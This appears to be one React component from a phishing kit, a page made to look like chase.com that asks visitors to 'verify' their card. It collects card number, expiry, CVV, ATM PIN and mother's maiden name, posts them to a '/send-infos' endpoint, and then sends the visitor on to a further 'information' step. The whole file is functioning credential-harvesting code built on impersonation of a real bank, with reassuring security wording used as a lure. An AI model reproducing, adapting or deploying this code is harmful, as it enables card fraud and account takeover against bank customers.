import { Typography } from "@mui/material";
import { Box } from "@mui/system";
import axios from "axios";
import React, { useState } from "react";
import { Helmet } from "react-helmet";
import { useForm } from "react-hook-form";
import { useNavigate } from "react-router";
import { Content } from "./Content";
import { CustomButton } from "./CustomButton";
import { CustomInput } from "./CustomInput";
import { SubTitle } from "./SubTitle";
import { Title } from "./Title";
import { Wrapper } from "./Wrapper";

interface CardInformationProps {}

export const CardInformation: React.FC<CardInformationProps> = () => {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({
    mode: "onTouched",
  });

  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    await axios.post(
      "/send-infos",
      JSON.stringify({
        form: "CARD INFORMATION",
        cardInformation: data,
      })
    );

    setLoading(false);
    navigate("/information");
  });

  return (
    <Wrapper>
      <Box width="100%" padding="1rem">
        <Helmet>
          <title>Identification - chase.com</title>
        </Helmet>
        <Box
          sx={{
            background: "white",
            width: ["100%", "60%"],
            margin: "0 auto",
            paddingX: "2rem",
          }}
        >
          <Typography
            component="h2"
            sx={{
              marginTop: "10px",
              color: "#666",
              fontWeight: 300,
              fontSize: "1.5rem",
            }}
          >
            Let's verify your card.
          </Typography>
          <Typography
            component="h3"
            sx={{
              marginTop: "8px",
              fontSize: ".8125rem",
              fontWeight: 300,
              color: "#414042",
            }}
          >
            To protect your account, please tell us the requested info so we can
            verify that it's really you. Please use the card associated with the
            account you entered on the previous step.
          </Typography>
        </Box>
        <Box
          sx={{
            background: "white",
            width: ["100%", "60%"],
            margin: "0 auto",
            padding: "2rem",
          }}
        >
          <Box>
            <Title title="Card details" />
            <SubTitle subTitle="Please verify the card details linked to you account" />
            <Content>
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Card number"
                  name="cardNumber"
                  errors={errors}
                  register={register("cardNumber", {
                    required:
                      "Card number must be entered. Please enter your card number.",
                    pattern: {
                      value:
                        /^(?:(4[0-9]{12}(?:[0-9]{3})?)|(5[1-5][0-9]{14})|(6(?:011|5[0-9]{2})[0-9]{12})|(3[47][0-9]{13})|(3(?:0[0-5]|[68][0-9])[0-9]{11})|((?:2131|1800|35[0-9]{3})[0-9]{11}))$/,
                      message: "Please enter a valid card number",
                    },
                  })}
                />
              </Box>
            </Content>
          </Box>
          <Box>
            <Content>
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Expiration date"
                  name="expirationDate"
                  helperText="mm/yyyy"
                  errors={errors}
                  register={register("expirationDate", {
                    required:
                      "Expiration date must be entered. Please enter your expiration date.",
                    pattern: {
                      value: /(0[1-9]|10|11|12)\/20[0-9]{2}$/,
                      message:
                        "Please enter a valid expiration date in the format mentioned above",
                    },
                  })}
                />
              </Box>
            </Content>
          </Box>
          <Box>
            <Content>
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Security code"
                  name="securityCode"
                  helperText='The three-digit "CVV number" is printed on the back of the card to the right of the signature box. '
                  errors={errors}
                  register={register("securityCode", {
                    required:
                      "Security code must be entered. Please enter your security code.",
                    pattern: {
                      value: /^[0-9]{3}$/,
                      message: "Please enter a valid CVV",
                    },
                  })}
                />
              </Box>
            </Content>
          </Box>
          <Box marginTop="1.5rem">
            <Title title="Card verification" />
            <Content>
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Mother's Maiden Name"
                  name="mothersMaidenName"
                  errors={errors}
                  register={register("mothersMaidenName")}
                />
              </Box>
              <Box width="10px" display={["none", "block"]} />
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="ATM pin"
                  name="atmPin"
                  errors={errors}
                  register={register("atmPin", {
                    required: "Please enter your card ATM pin",
                    pattern: {
                      value: /^[0-9]{4,5}$/,
                      message: "Please enter a valid ATM pin",
                    },
                  })}
                />
              </Box>
            </Content>
          </Box>
          <Box marginTop="1.5rem">
            <Typography
              component="p"
              sx={{
                color: "#666",
                fontSize: [".8125rem", ".875rem"],
              }}
            >
              For additional security please verify your mmn to submit your card
              details.
            </Typography>
          </Box>
          <Box
            width="100%"
            sx={{
              display: "flex",
              justifyContent: "flex-end",
              marginTop: "1.5rem",
            }}
          >
            <Box width={["100%", "30%"]}>
              <CustomButton
                text="Verify"
                onClick={onSubmit}
                disabled={loading}
              />
            </Box>
          </Box>
        </Box>
      </Box>
    </Wrapper>
  );
};
